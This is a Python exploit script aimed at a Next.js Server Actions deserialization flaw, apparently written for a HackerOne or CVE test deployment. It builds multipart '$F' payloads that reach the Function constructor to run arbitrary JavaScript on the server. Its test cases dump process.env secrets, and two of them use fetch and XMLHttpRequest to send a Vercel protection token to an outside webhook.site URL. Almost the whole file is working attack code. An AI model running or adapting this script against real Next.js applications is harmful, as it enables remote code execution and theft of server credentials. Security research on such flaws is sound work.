#!/usr/bin/env python3
"""
Minimal payloads without require() - use only built-in functions
"""

import requests
import json
import random
import string

TARGET = "https://nextjs-cve-hackerone.vercel.app"
ACTION_ID = "007138e0bfbdd7fe024391a1251fd5861f0b5145dc"
WEBHOOK = "https://webhook.site/f794cbb8-6c39-49cc-987a-a141d67c244a"

def minimal_poc(code, label):
    """Minimal $F payload"""
    print(f"\n[*] {label}")

    boundary = "----WebKitFormBoundary" + ''.join(random.choices(string.ascii_letters + string.digits, k=16))

    payload_0 = f"$F1#{ACTION_ID}#constructor"
    payload_1 = {"constructor": {"constructor": code}}

    body = f'------{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="0"\r\n\r\n'
    body += payload_0 + '\r\n'
    body += f'------{boundary}\r\n'
    body += 'Content-Disposition: form-data; name="1"\r\n\r\n'
    body += json.dumps(payload_1) + '\r\n'
    body += f'------{boundary}--\r\n'

    headers = {
        'Next-Action': ACTION_ID,
        'Content-Type': f'multipart/form-data; boundary=----{boundary}',
        'Accept': 'text/x-component',
    }

    r = requests.post(TARGET, data=body, headers=headers, timeout=15)
    print(f"    Status: {r.status_code} - Digest: {r.text[80:110] if len(r.text) > 80 else 'N/A'}")
    return r

print("="*70)
print("Minimal Payloads - No require()")
print("="*70)

# Test 1: Just return env var (no require)
minimal_poc("process.env.VERCEL_PLATFORM_PROTECTION", "Direct env return")

# Test 2: Throw error with env
minimal_poc("throw new Error(process.env.VERCEL_PLATFORM_PROTECTION)", "Throw env as error")

# Test 3: Use global object
minimal_poc("global.process.env.VERCEL_PLATFORM_PROTECTION", "Via global")

# Test 4: JSON stringify env
minimal_poc("JSON.stringify(process.env)", "JSON.stringify all env")

# Test 5: Just the keys
minimal_poc("Object.keys(process.env).join(',')", "All env keys")

# Test 6: Filter for VERCEL
minimal_poc("Object.keys(process.env).filter(k=>k.includes('VERCEL'))", "VERCEL keys only")

# Test 7: Use fetch if available (browser API)
minimal_poc(f"fetch('{WEBHOOK}?x='+process.env.VERCEL_PLATFORM_PROTECTION).catch(()=>{{}})", "fetch API")

# Test 8: XMLHttpRequest if available
minimal_poc(f"""
(new XMLHttpRequest()).open('GET','{WEBHOOK}?x='+process.env.VERCEL_PLATFORM_PROTECTION,true)
""", "XMLHttpRequest")

print("="*70)
